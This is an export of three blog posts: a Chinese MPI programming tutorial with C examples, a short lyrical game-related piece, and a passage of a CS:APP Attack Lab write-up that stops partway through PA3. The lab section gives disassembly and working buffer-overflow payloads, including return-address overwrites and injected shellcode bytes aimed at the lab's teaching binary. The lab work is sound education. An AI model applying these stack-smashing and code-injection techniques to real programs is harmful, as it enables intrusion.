[{"content":"01-hello world Write a program that uses MPI and has each MPI process print Hello world from process i of n.\n1 2 3 4 5 6 7 8 9 10 11 12 13  #include \u0026lt;stdio.h\u0026gt;#include \u0026#34;mpi.h\u0026#34; int main(int argc, char **argv) { int rank, size; MPI_Init(\u0026amp;argc, \u0026amp;argv); MPI_Comm_size(MPI_COMM_WORLD, \u0026amp;size); MPI_Comm_rank(MPI_COMM_WORLD, \u0026amp;rank); printf(\u0026#34;Hello world from process %d of %d\\n\u0026#34;, rank, size); MPI_Finalize(); return 0; }   这里重点解释：MPI_Comm_size用于获取该通信域内的总进程数，如果通信域为MP_COMM_WORLD，即获取总进程数；MPI_Comm_rank用于获得当前进程的进程标识，如进程0在执行该函数时，可以获得返回值0。\n1 2 3 4 5 6 7 8  Ther% mpicc 01-hello.c -o 01-hello Ther% ./01-hello Hello world from process 0 of 1 Ther% mpirun -np 4 01-hello Hello world from process 1 of 4 Hello world from process 3 of 4 Hello world from process 2 of 4 Hello world from process 0 of 4   注意程序有两种启动方式：若直接启动，则只开启一个进程；若使用mpirun指令，则可以同时启动多个进程。\n02-sharing data Write a program that reads an integer value from the terminal and distributes the value to all of the MPI processes. Each process should print out its rank and the value it received. Values should be read until a negative integer is given as input.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  #include \u0026lt;stdio.h\u0026gt;#include \u0026#34;mpi.h\u0026#34; int main(int argc, char **argv) { int rank, value; MPI_Init(\u0026amp;argc, \u0026amp;argv); MPI_Comm_rank(MPI_COMM_WORLD, \u0026amp;rank); do { if (rank == 0) scanf(\u0026#34;%d\u0026#34;, \u0026amp;value); MPI_Bcast(\u0026amp;value, 1, MPI_INT, 0, MPI_COMM_WORLD); printf(\u0026#34;Process %d got %d\\n\u0026#34;, rank, value); } while (value \u0026gt;= 0); MPI_Finalize(); return 0; }   这一任务本质上是将主进程上的值广播到其他进程，用到的MPI_Bcast函数定义如下：\n1 2 3 4 5 6 7 8  int MPI_Bcast(void *buffer, int count, MPI_Datatype datatype, int root, MPI_Comm comm) /* buffer: starting address of buffer (choice) count: number of entries in buffer (integer) datatype: data type of buffer (handle) root: rank of broadcast root (integer) comm: communicator (handle) */   03-sending in a ring Write a program that takes data from process zero and sends it to all of the other processes by sending it in a ring. That is, process i should receive the data and send it to process i+1, until the last process is reached.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  #include \u0026lt;stdio.h\u0026gt;#include \u0026#34;mpi.h\u0026#34; int main(int argc, char **argv) { int rank, value, size; MPI_Status status; MPI_Init(\u0026amp;argc, \u0026amp;argv); MPI_Comm_rank(MPI_COMM_WORLD, \u0026amp;rank); MPI_Comm_size(MPI_COMM_WORLD, \u0026amp;size); do { if (rank == 0) { scanf(\u0026#34;%d\u0026#34;, \u0026amp;value); MPI_Send(\u0026amp;value, 1, MPI_INT, rank + 1, 0, MPI_COMM_WORLD); } else { MPI_Recv(\u0026amp;value, 1, MPI_INT, rank - 1, 0, MPI_COMM_WORLD, \u0026amp;status); if (rank \u0026lt; size - 1) MPI_Send(\u0026amp;value, 1, MPI_INT, rank + 1, 0, MPI_COMM_WORLD); } printf(\u0026#34;Process %d got %d\\n\u0026#34;, rank, value); } while (value \u0026gt;= 0); MPI_Finalize(); return 0; }   MPI_Send和MPI_Recv的用法详见MPI_Send和MPI_Recv。这里注意以下几个参数：\n tag：信息标志，同为整型变量，发送和接收需要tag一致，这将可以区分同一目的地的不同消息。 status：在Recv中用于返回状态信息，可以通过status.MPI_SOURCE，status.MPI_TAG和status.MPI_ERROR的方式调用这三个信息。这三个信息分别返回的值是所收到数据发送源的进程号，该消息的tag值和接收操作的错误代码。  04-estimate $\\pi$ This exercise presents a simple program to determine the value of pi. The algorithm suggested here is chosen for its simplicity. The method evaluates the integral of 4/(1+x*x) between 0 and 1. The method is simple: the integral is approximated by a sum of n intervals; the approximation to the integral in each interval is (1/n)*4/(1+x*x). The master process (rank 0) asks the user for the number of intervals; the master should then broadcast this number to all of the other processes. Each process then adds up every n\u0026rsquo;th interval (x = rank/n, rank/n+size/n,\u0026hellip;). Finally, the sums computed by each process are added together using a reduction. $$ \\pi = \\int_0^1 \\frac{4}{1+x^2}dx $$ 翻译一下要求：我们将积分可以分成N小段求和，每一段的求和是独立的，可以通过并行计算完成。主进程得到N值，而后分发给N个子进程进行运算，最后将求和结果发回给父进程。 $$ \\pi = \\frac{1}{N} \\times \\sum_{i=1}^N(\\frac{4}{1+x^2})|_{x=\\frac{2i-1}{2N}} $$ 接下来是核心的计算实现部分：以4个进程为例，我们想把100次循环计算分给4个进程。最佳的实现方法是使用0进程计算1,5,9，1进程计算2,6,10\u0026hellip;，这样会使各个进程的逻辑实现是相同的。\n最后各进程的求和操作采用了MPI_Reduce，这一函数用于将所有进程的值“合并”为同一个值，并送到主进程。这一操作也叫做”规约操作“。\n 规约是一类并行算法，对传入的N个数据，使用一个二元的符合结合律的操作符⊕，生成1个结果。这类操作包括取最小、取最大、求和、平方和、逻辑与/或、向量点积。规约也是其他高级算法中重要的基础算法。\n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43  #include \u0026lt;math.h\u0026gt;#include \u0026lt;stdio.h\u0026gt;#include \u0026#34;mpi.h\u0026#34; int main(int argc, char **argv) { int done = 0, n, myid, numprocs, i; double PI25DT = 3.141592653589793238462643; double mypi, pi, h, sum, x; MPI_Init(\u0026amp;argc, \u0026amp;argv); MPI_Comm_size(MPI_COMM_WORLD, \u0026amp;numprocs); MPI_Comm_rank(MPI_COMM_WORLD, \u0026amp;myid); while (!done) { if (myid == 0) // choose the main process  { printf(\u0026#34;Enter the number of intervals: (0 quits) \u0026#34;); scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); } MPI_Bcast(\u0026amp;n, 1, MPI_INT, 0, MPI_COMM_WORLD); // broadcast the number of intervals to all processes  if (n == 0) break; h = 1.0 / (double)n; sum = 0.0; for (i = myid + 1; i \u0026lt;= n; i += numprocs) // the gap is number of process  { x = h * ((double)i - 0.5); sum += 4.0 / (1.0 + x * x); } mypi = h * sum; MPI_Reduce(\u0026amp;mypi, \u0026amp;pi, 1, MPI_DOUBLE, MPI_SUM, 0, MPI_COMM_WORLD); if (myid == 0) printf(\u0026#34;pi is approximately %.16f, Error is %.16f\\n\u0026#34;, pi, fabs(pi - PI25DT)); } MPI_Finalize(); return 0; }   05-fairness in message passing Write a program to test how fair the message passing implementation is. To do this, have all processes except process 0 send 100 messages to process 0. Have process 0 print out the messages as it receives them, using MPI_ANY_SOURCE and MPI_ANY_TAG in MPI_Recv.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  #include \u0026#34;mpi.h\u0026#34;#include \u0026lt;stdio.h\u0026gt;int main(int argc, char **argv) { int rank, size, i, buf[1]; MPI_Status status; MPI_Init(\u0026amp;argc, \u0026amp;argv); MPI_Comm_rank(MPI_COMM_WORLD, \u0026amp;rank); MPI_Comm_size(MPI_COMM_WORLD, \u0026amp;size); if (rank == 0) { for (i = 0; i \u0026lt; 100 * (size - 1); i++) { MPI_Recv(buf, 1, MPI_INT, MPI_ANY_SOURCE, MPI_ANY_TAG, MPI_COMM_WORLD, \u0026amp;status); printf(\u0026#34;Msg from %d with tag %d\\n\u0026#34;, status.MPI_SOURCE, status.MPI_TAG); } } else { for (i = 0; i \u0026lt; 100; i++) { MPI_Send(buf, 1, MPI_INT, 0, i, MPI_COMM_WORLD); } } MPI_Finalize(); return 0; }   这里主要实现了信息的过滤和筛选。MPI_ANY_SOURCE和MPI_ANY_TAG对信息的进程来源和TAG不作约束，否则不符合要求的信息就会被过滤。\n06-parallel data structure 原题就不贴了，翻译一下：有一个数据结构double x[maxn][maxn]，我们想要将其分配给若干个进程double xlocal[maxn][maxn/size]。然而在更新数据x[i][j]时，需要相邻的4个值：x[i][j+1] x[i][j-1] x[i+1][j] x[i-1][j]。这些值不一定在同一个进程上，同步比较麻烦，我们需要设计算法进行同步。我们将这些不在同一个进程上的点定义为“ghost point”。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74  #include \u0026lt;stdio.h\u0026gt;#include \u0026#34;mpi.h\u0026#34; /* This example handles a 12 x 12 mesh, on 4 processors only. */ #define maxn 12  int main(int argc, char **argv) { int rank, value, size, errcnt, toterr, i, j; MPI_Status status; double x[12][12]; double xlocal[(12 / 4) + 2][12]; // 4 processors, with 2 ghostpoints  MPI_Init(\u0026amp;argc, \u0026amp;argv); MPI_Comm_rank(MPI_COMM_WORLD, \u0026amp;rank); MPI_Comm_size(MPI_COMM_WORLD, \u0026amp;size); if (size != 4) MPI_Abort(MPI_COMM_WORLD, 1); // Abort if not 4 processors  /* xlocal[][0] is lower ghostpoints, xlocal[][maxn+2] is upper */ /* Fill the data as specified */ for (i = 1; i \u0026lt;= maxn / size; i++) // initialize the local array  for (j = 0; j \u0026lt; maxn; j++) xlocal[i][j] = rank; for (j = 0; j \u0026lt; maxn; j++) // initialize the ghostpoints  { xlocal[0][j] = -1; xlocal[maxn / size + 1][j] = -1; } /* Send up unless I\u0026#39;m at the top, then receive from below */ /* Note the use of xlocal[i] for \u0026amp;xlocal[i][0] */ if (rank \u0026lt; size - 1) MPI_Send(xlocal[maxn / size], maxn, MPI_DOUBLE, rank + 1, 0, MPI_COMM_WORLD); if (rank \u0026gt; 0) MPI_Recv(xlocal[0], maxn, MPI_DOUBLE, rank - 1, 0, MPI_COMM_WORLD, \u0026amp;status); /* Send down unless I\u0026#39;m at the bottom */ if (rank \u0026gt; 0) MPI_Send(xlocal[1], maxn, MPI_DOUBLE, rank - 1, 1, MPI_COMM_WORLD); if (rank \u0026lt; size - 1) MPI_Recv(xlocal[maxn / size + 1], maxn, MPI_DOUBLE, rank + 1, 1, MPI_COMM_WORLD, \u0026amp;status); /* Check that we have the correct results */ errcnt = 0; for (i = 1; i \u0026lt;= maxn / size; i++) for (j = 0; j \u0026lt; maxn; j++) if (xlocal[i][j] != rank) errcnt++; for (j = 0; j \u0026lt; maxn; j++) { if (xlocal[0][j] != rank - 1) errcnt++; if (rank \u0026lt; size - 1 \u0026amp;\u0026amp; xlocal[maxn / size + 1][j] != rank + 1) errcnt++; } MPI_Reduce(\u0026amp;errcnt, \u0026amp;toterr, 1, MPI_INT, MPI_SUM, 0, MPI_COMM_WORLD); if (rank == 0) { if (toterr) printf(\u0026#34;! found %d errors\\n\u0026#34;, toterr); else printf(\u0026#34;No errors\\n\u0026#34;); } MPI_Finalize(); return 0; }   代码的整体逻辑如下：首先初始化好每一个process上的local value和ghost value，之后根据条件将每一个process的第一行/最后一行分别发送给上一个/下一个process，ghost value得到了更新（这里有几个细节需要注意：首先是发送个数和发送TAG，其次Send和Recv的先后）。\n 不过这样有一个问题：ghost value的存在增大了进程的本地开销，能否有更省空间的方法？\n 07-jacobi iteration 本节实现的jacobi iteration的计算公式如下： $$ a[i][j] = 0.25(a[i - 1][j] + a[i + 1][j] + a[i][j - 1] + a[i][j + 1]) $$ 首先看默认解法。进程间的通信思路和上一小节类似，此处不再赘述，贴出代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92  #include \u0026lt;stdio.h\u0026gt;#include \u0026lt;math.h\u0026gt;#include \u0026#34;mpi.h\u0026#34; /* This example handles a 12 x 12 mesh, on 4 processors only. */ #define maxn 12  int main(int argc, char **argv) { int rank, value, size, errcnt, toterr, i, j, itcnt; int i_first, i_last; MPI_Status status; double diffnorm, gdiffnorm; double xlocal[(12 / 4) + 2][12]; double xnew[(12 / 3) + 2][12]; MPI_Init(\u0026amp;argc, \u0026amp;argv); MPI_Comm_rank(MPI_COMM_WORLD, \u0026amp;rank); MPI_Comm_size(MPI_COMM_WORLD, \u0026amp;size); if (size != 4) MPI_Abort(MPI_COMM_WORLD, 1); /* xlocal[][0] is lower ghostpoints, xlocal[][maxn+2] is upper */ /* Note that top and bottom processes have one less row of interior points */ i_first = 1; i_last = maxn / size; if (rank == 0) i_first++; if (rank == size - 1) i_last--; /* Fill the data as specified */ for (i = 1; i \u0026lt;= maxn / size; i++) for (j = 0; j \u0026lt; maxn; j++) xlocal[i][j] = rank; for (j = 0; j \u0026lt; maxn; j++) { xlocal[i_first - 1][j] = -1; xlocal[i_last + 1][j] = -1; } itcnt = 0; do { /* Send up unless I\u0026#39;m at the top, then receive from below */ /* Note the use of xlocal[i] for \u0026amp;xlocal[i][0] */ if (rank \u0026lt; size - 1) MPI_Send(xlocal[maxn / size], maxn, MPI_DOUBLE, rank + 1, 0, MPI_COMM_WORLD); if (rank \u0026gt; 0) MPI_Recv(xlocal[0], maxn, MPI_DOUBLE, rank - 1, 0, MPI_COMM_WORLD, \u0026amp;status); /* Send down unless I\u0026#39;m at the bottom */ if (rank \u0026gt; 0) MPI_Send(xlocal[1], maxn, MPI_DOUBLE, rank - 1, 1, MPI_COMM_WORLD); if (rank \u0026lt; size - 1) MPI_Recv(xlocal[maxn / size + 1], maxn, MPI_DOUBLE, rank + 1, 1, MPI_COMM_WORLD, \u0026amp;status); /* Compute new values (but not on boundary) */ itcnt++; diffnorm = 0.0; for (i = i_first; i \u0026lt;= i_last; i++) for (j = 1; j \u0026lt; maxn - 1; j++) { xnew[i][j] = (xlocal[i][j + 1] + xlocal[i][j - 1] + xlocal[i + 1][j] + xlocal[i - 1][j]) / 4.0; diffnorm += (xnew[i][j] - xlocal[i][j]) * (xnew[i][j] - xlocal[i][j]); } /* Only transfer the interior points */ for (i = i_first; i \u0026lt;= i_last; i++) for (j = 1; j \u0026lt; maxn - 1; j++) xlocal[i][j] = xnew[i][j]; MPI_Allreduce(\u0026amp;diffnorm, \u0026amp;gdiffnorm, 1, MPI_DOUBLE, MPI_SUM, MPI_COMM_WORLD); gdiffnorm = sqrt(gdiffnorm); if (rank == 0) printf(\u0026#34;At iteration %d, diff is %e\\n\u0026#34;, itcnt, gdiffnorm); } while (gdiffnorm \u0026gt; 1.0e-2 \u0026amp;\u0026amp; itcnt \u0026lt; 100); MPI_Finalize(); return 0; }    注意在编译时需要链接libm.so：\n1  mpicc 07-jacobi-iteration.c -o 07-jacobi-iteration -lm    这里出现了一个新函数MPI_Allreduce。许多并行程序中，需要在所有进程而不是仅仅在根进程中访问归约的结果，与MPI_reduce不同的是，MPI_Allreduce 将归约所有值并将结果分配给所有进程。\n当然，以上代码还有改进的空间：在代码规模大且程序结构复杂的情况下，匹配SEND和RECV需要额外花费较多精力。我们注意到在此例中SEND和RECV是成对出现的，我们可以将其绑定（使用MPI_Sendrecv）；同时，最上方和最下方由于格式不统一需要进行单独编写，我们可以引入虚拟进程MPI_PROC_NULL来对代码进行规范化：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  - if (rank \u0026lt; size - 1) - MPI_Send(xlocal[maxn / size], maxn, MPI_DOUBLE, rank + 1, 0, - MPI_COMM_WORLD); - if (rank \u0026gt; 0) - MPI_Recv(xlocal[0], maxn, MPI_DOUBLE, rank - 1, 0, - MPI_COMM_WORLD, \u0026amp;status); - if (rank \u0026gt; 0) - MPI_Send(xlocal[1], maxn, MPI_DOUBLE, rank - 1, 1, - MPI_COMM_WORLD); - if (rank \u0026lt; size - 1) - MPI_Recv(xlocal[maxn / size + 1], maxn, MPI_DOUBLE, rank + 1, 1, - MPI_COMM_WORLD, \u0026amp;status);  + MPI_Sendrecv(xlocal[maxn / size], maxn, MPI_DOUBLE, rank \u0026lt; size - 1 ? rank + 1 : MPI_PROC_NULL, 0, xlocal[0], maxn, MPI_DOUBLE, rank \u0026gt; 0 ? rank - 1 : MPI_PROC_NULL, 0, MPI_COMM_WORLD, \u0026amp;status); + MPI_Sendrecv(xlocal[1], maxn, MPI_DOUBLE, rank \u0026gt; 0 ? rank - 1 : MPI_PROC_NULL, 1, xlocal[maxn / size + 1], maxn, MPI_DOUBLE, rank \u0026lt; size - 1 ? rank + 1 : MPI_PROC_NULL, 1, MPI_COMM_WORLD, \u0026amp;status);   08-collecting data 这是上一节的延续。我们需要将迭代结果在主进程中显示。此处用到了MPI_Gather函数，用于将所有进程的数据进行聚合（没有规约等操作）。\n1 2 3 4 5 6  /* Collect the data into x and print it */ /* This code (and the declaration of x above) are the only changes to the Jacobi code */ MPI_Gather(xlocal[1], maxn * (maxn / size), MPI_DOUBLE, x, maxn * (maxn / size), MPI_DOUBLE, 0, MPI_COMM_WORLD);   我们看一下Gather的操作：参数定义了每一个send buffer的起始地址和长度，以及recv buffer的起始地址和每一次接收的长度。接收到的数据按照进程号排列。\nReference Tutorial material on MPI available on the Web\n","date":"2023-03-05T00:00:00Z","permalink":"https://ther-nullptr.github.io/posts/high-performance-computing/mpi/","title":"MPI Basic"},{"content":"一 为什么，你们就能够这么轻松地肯定呢。\n为什么，你们就能够这么容易地，“相信” 呢··\u0026hellip;.\n为什么，你们会这么有动力呢\n为什么，你们就一定会认为一定会成功呢。\n二 婉紫嫣红的烟花束，一朵一朵地腾空而起然后在夜空中支离破碎，形成连续不断的璀璨。\n绽放过后的礼花残骸，就如同多情的流星雨，却又只能在落下数秒后便燃烧殆尽。\n虽然转瞬即逝，但又像在眼中刻下烙痕一般，令人无法忘却。\n我也无时无刻，不对自己说着那卑屈又充满着自我厌恶的谎言。\n无时无刻，不在因为这肮脏的温柔，伤害着周围的人。\n","date":"2023-02-27T00:00:00Z","permalink":"https://ther-nullptr.github.io/posts/games/three/","title":"трехцветная история любви"},{"content":"Attack Lab 前言 在这个lab中，PA1、2、3是代码注入（code injection）攻击，PA4、5是回归导向（return oriented programming）攻击。\n Code Injection：将恶意代码注入到一个应用程序中的攻击。然后应用程序解释或执行该代码，影响应用程序的性能和功能。 Return Oriented Programming：通过栈缓冲器溢出等方式控制堆栈调用以劫持程序控制流并执行针对性的机器语言指令序列。  PA 1 1 2 3 4 5 6 7 8 9 10 11 12 13  void test() { int val; val = getbuf(); printf(\u0026#34;No exploit. Getbuf returned 0x%x\\n\u0026#34;, val); } void touch1() { vlevel = 1; printf(\u0026#34;Touch!: You called touch1()\\n\u0026#34;); validate(1); exit(0); }   PA 1要求在执行test函数时执行touch1函数。正常情况下调用test会直接返回：\n1 2 3 4  Cookie: 0x59b997fa Type string:12345 No exploit. Getbuf returned 0x1 Normal return   查看getbuf的反汇编：\n1 2 3 4 5 6 7 8 9  00000000004017a8 \u0026lt;getbuf\u0026gt;: 4017a8:\t48 83 ec 28 sub $0x28,%rsp 4017ac:\t48 89 e7 mov %rsp,%rdi 4017af:\te8 8c 02 00 00 callq 401a40 \u0026lt;Gets\u0026gt; 4017b4:\tb8 01 00 00 00 mov $0x1,%eax 4017b9:\t48 83 c4 28 add $0x28,%rsp 4017bd:\tc3 retq 4017be:\t90 nop 4017bf:\t90 nop   可以看到，理想情况下，getbuf会开辟40个字节的栈空间，输入的字符串填入新开辟的栈空间中，示意图如下（该函数的设置比较简单，既没有帧指针，也没有金丝雀值）：\n为了验证这点，我们在add $0x28,%rsp之前查看栈空间的使用情况：\n可以看到，被调用者所开辟的40 bytes所有的栈空间均被输入的40个字符串（最后一个是结束符\u0026rsquo;\\0\u0026rsquo;，所以实际上输入了39个字符）所占据；紧随其后的是一串数字0x401976恰好对应汇编语句mov %eax,%edx，也就是调用\u0026lt;getbuf\u0026gt;后返回的下一条语句。\n因此，此处需要额外输入字符串，以改写0x5561dca0处的值，使其值为touch1函数开始的地址。注意此处数据的存储格式为小端（little endian），即低位放在较小的地址处。在地址注入时，我们需要先输入低位的字节，首先写出16进制形式：\n1 2 3 4 5 6  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 17 40   使用以下语句进行转换：\n1  $ ./hex2raw \u0026lt; pa1.txt \u0026gt; pa1out.txt   最终结果如下：\nPA 2 PA 2在PA 1的基础上新增了传入函数参数的要求。首先查看touch2的汇编：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  00000000004017ec \u0026lt;touch2\u0026gt;: 4017ec:\t48 83 ec 08 sub $0x8,%rsp 4017f0:\t89 fa mov %edi,%edx 4017f2:\tc7 05 e0 2c 20 00 02 movl $0x2,0x202ce0(%rip) # 6044dc \u0026lt;vlevel\u0026gt; 4017f9:\t00 00 00 4017fc:\t3b 3d e2 2c 20 00 cmp 0x202ce2(%rip),%edi # 6044e4 \u0026lt;cookie\u0026gt; 401802:\t75 20 jne 401824 \u0026lt;touch2+0x38\u0026gt; 401804:\tbe e8 30 40 00 mov $0x4030e8,%esi 401809:\tbf 01 00 00 00 mov $0x1,%edi 40180e:\tb8 00 00 00 00 mov $0x0,%eax 401813:\te8 d8 f5 ff ff callq 400df0 \u0026lt;__printf_chk@plt\u0026gt; 401818:\tbf 02 00 00 00 mov $0x2,%edi 40181d:\te8 6b 04 00 00 callq 401c8d \u0026lt;validate\u0026gt; 401822:\teb 1e jmp 401842 \u0026lt;touch2+0x56\u0026gt; 401824:\tbe 10 31 40 00 mov $0x403110,%esi 401829:\tbf 01 00 00 00 mov $0x1,%edi 40182e:\tb8 00 00 00 00 mov $0x0,%eax 401833:\te8 b8 f5 ff ff callq 400df0 \u0026lt;__printf_chk@plt\u0026gt; 401838:\tbf 02 00 00 00 mov $0x2,%edi 40183d:\te8 0d 05 00 00 callq 401d4f \u0026lt;fail\u0026gt; 401842:\tbf 00 00 00 00 mov $0x0,%edi 401847:\te8 f4 f5 ff ff callq 400e40 \u0026lt;exit@plt\u0026gt;   对照原始C代码：\n1 2 3 4 5 6 7 8 9 10 11  void touch2(unsigned val) { vlevel = 2; if (val == cookie) { printf(\u0026#34;Touch2!: You called touch2(0x%.8x)\\n\u0026#34;, val); validate(2); } else { printf(\u0026#34;Misfire: You called touch2(0x%.8x)\\n\u0026#34;, val); fail(2); } exit(0); }   函数的第一个参数存储在$edi中，而且需要与cookie的值相同，为0x59b997fa。这要求在getbuf函数在返回之前需要执行以下命令：\n1 2 3  mov $0x59b997fa, %rdi # 将cookie的值赋给rdi pushq $0x4017ec # 放入touch2的返回地址 ret   对其进行反汇编：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  nullptr•csapp/labs/attack(master⚡)» gcc -c pa2.s [16:58:43] pa2.s: Assembler messages: pa2.s: Warning: end of file not at end of a line; newline inserted nullptr•csapp/labs/attack(master⚡)» objdump -d pa2.o [16:58:52] pa2.o: file format elf64-x86-64 Disassembly of section .text: 0000000000000000 \u0026lt;.text\u0026gt;: 0: 48 c7 c7 fa 97 b9 59 mov $0x59b997fa,%rdi 7: 68 ec 17 40 00 pushq $0x4017ec c: c3 retq   根据上一问的结果，$rsp所在的位置是0x5561dc78，我们需要将上述指令注入到这一位置，更具体的逻辑见下图：\n注入指令之后，返回地址变成了之前$rsp所在的位置，随后$pc会跳转到这个位置，执行上述指令，这个时候$rsp也会随之将新的返回地址压栈，执行完毕后顺利跳转到touch2函数。\n 这里非常绕的一点在于，$rsp和$pc两个本来运行在互不干涉空间的指针，由于指令的刻意引导，在同一个空间内运行！理解清楚这一点，这个问题就迎刃而解。\n 输入语句如下（同样注意指令的大小端放置）：\n1 2 3 4 5 6  48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 33 78 dc 61 55 00 00 00 00   最终结果：\nPA 3 汇编：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78  00000000004018fa \u0026lt;touch3\u0026gt;: 4018fa:\t53 push %rbx 4018fb:\t48 89 fb mov %rdi,%rbx 4018fe:\tc7 05 d4 2b 20 00 03 movl $0x3,0x202bd4(%rip) # 6044dc \u0026lt;vlevel\u0026gt; 401905:\t00 00 00 401908:\t48 89 fe mov %rdi,%rsi 40190b:\t8b 3d d3 2b 20 00 mov 0x202bd3(%rip),%edi # 6044e4 \u0026lt;cookie\u0026gt; 401911:\te8 36 ff ff ff callq 40184c \u0026lt;hexmatch\u0026gt; 401916:\t85 c0 test %eax,%eax 401918:\t74 23 je 40193d \u0026lt;touch3+0x43\u0026gt; 40191a:\t48 89 da mov %rbx,%rdx 40191d:\tbe 38 31 40 00 mov $0x403138,%esi 401922:\tbf 01 00 00 00 mov $0x1,%edi 401927:\tb8 00 00 00 00 mov $0x0,%eax 40192c:\te8 bf f4 ff ff callq 400df0 \u0026lt;__printf_chk@plt\u0026gt; 401931:\tbf 03 00 00 00 mov $0x3,%edi 401936:\te8 52 03 00 00 callq 401c8d \u0026lt;validate\u0026gt; 40193b:\teb 21 jmp 40195e \u0026lt;touch3+0x64\u0026gt; 40193d:\t48 89 da mov %rbx,%rdx 401940:\tbe 60 31 40 00 mov $0x403160,%esi 401945:\tbf 01 00 00 00 mov $0x1,%edi 40194a:\tb8 00 00 00 00 mov $0x0,%eax 40194f:\te8 9c f4 ff ff callq 400df0 \u0026lt;__printf_chk@plt\u0026gt; 401954:\tbf 03 00 00 00 mov $0x3,%edi 401959:\te8 f1 03 00 00 callq 401d4f \u0026lt;fail\u0026gt; 40195e:\tbf 00 00 00 00 mov $0x0,%edi 401963:\te8 d8 f4 ff ff callq 400e40 \u0026lt;exit@plt\u0026gt; 000000000040184c \u0026lt;hexmatch\u0026gt;: 40184c:\t41 54 push %r12 40184e:\t55 push %rbp 40184f:\t53 push %rbx 401850:\t48 83 c4 80 add $0xffffffffffffff80,%rsp 401854:\t41 89 fc mov %edi,%r12d 401857:\t48 89 f5 mov %rsi,%rbp 40185a:\t64 48 8b 04 25 28 00 mov %fs:0x28,%rax 401861:\t00 00 401863:\t48 89 44 24 78 mov %rax,0x78(%rsp) 401868:\t31 c0 xor %eax,%eax 40186a:\te8 41 f5 ff ff callq 400db0 \u0026lt;random@plt\u0026gt; 40186f:\t48 89 c1 mov %rax,%rcx 401872:\t48 ba 0b d7 a3 70 3d movabs $0xa3d70a3d70a3d70b,%rdx 401879:\t0a d7 a3 40187c:\t48 f7 ea imul %rdx 40187f:\t48 01 ca add %rcx,%rdx 401882:\t48 c1 fa 06 sar $0x6,%rdx 401886:\t48 89 c8 mov %rcx,%rax 401889:\t48 c1 f8 3f sar $0x3f,%rax 40188d:\t48 29 c2 sub %rax,%rdx 401890:\t48 8d 04 92 lea (%rdx,%rdx,4),%rax 401894:\t48 8d 04 80 lea (%rax,%rax,4),%rax 401898:\t48 c1 e0 02 shl $0x2,%rax 40189c:\t48 29 c1 sub %rax,%rcx 40189f:\t48 8d 1c 0c lea (%rsp,%rcx,1),%rbx 4018a3:\t45 89 e0 mov %r12d,%r8d 4018a6:\tb9 e2 30 40 00 mov $0x4030e2,%ecx 4018ab:\t48 c7 c2 ff ff ff ff mov $0xffffffffffffffff,%rdx 4018b2:\tbe 01 00 00 00 mov $0x1,%esi 4018b7:\t48 89 df mov %rbx,%rdi 4018ba:\tb8 00 00 00 00 mov $0x0,%eax 4018bf:\te8 ac f5 ff ff callq 400e70 \u0026lt;__sprintf_chk@plt\u0026gt; 4018c4:\tba 09 00 00 00 mov $0x9,%edx 4018c9:\t48 89 de mov %rbx,%rsi 4018cc:\t48 89 ef mov %rbp,%rdi 4018cf:\te8 cc f3 ff ff callq 400ca0 \u0026lt;strncmp@plt\u0026gt; 4018d4:\t85 c0 test %eax,%eax 4018d6:\t0f 94 c0 sete %al 4018d9:\t0f b6 c0 movzbl %al,%eax 4018dc:\t48 8b 74 24 78 mov 0x78(%rsp),%rsi 4018e1:\t64 48 33 34 25 28 00 xor %fs:0x28,%rsi 4018e8:\t00 00 4018ea:\t74 05 je 4018f1 \u0026lt;hexmatch+0xa5\u0026gt; 4018ec:\te8 ef f3 ff ff callq 400ce0 \u0026lt;__stack_chk_fail@plt\u0026gt; 4018f1:\t48 83 ec 80 sub $0xffffffffffffff80,%rsp 4018f5:\t5b pop %rbx 4018f6:\t5d pop %rbp 4018f7:\t41 5c pop %r12 4018f9:\tc3 retq   C代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  void touch3(char *sval) { vlevel = 3; if (hexmatch(cookie, sval)) { printf(\u0026#34;Touch3!: You called touch3(\\\u0026#34;%s\\\u0026#34;)\\n\u0026#34;, sval); validate(3); } else { printf(\u0026#34;Misfire: You called touch3(\\\u0026#34;%s\\\u0026#34;)\\n\u0026#34;, sval); fail(3); } exit(0); } int hexmatch(unsigned val, char *sval) { char cbuf[110]; char *s = cbuf + random() % 100; sprintf(s, \u0026#34;%.8x\u0026#34;, val); return strncmp(sval, s, 9) == 0; }   和PA 2的不同之处在于，这里传入的参数是字符串。cookie的十六进制字符串是59b997fa，也就是（注意结束符）：\n1  0x35 0x39 0x62 0x39 0x39 0x37 0x66 0x61 0x00   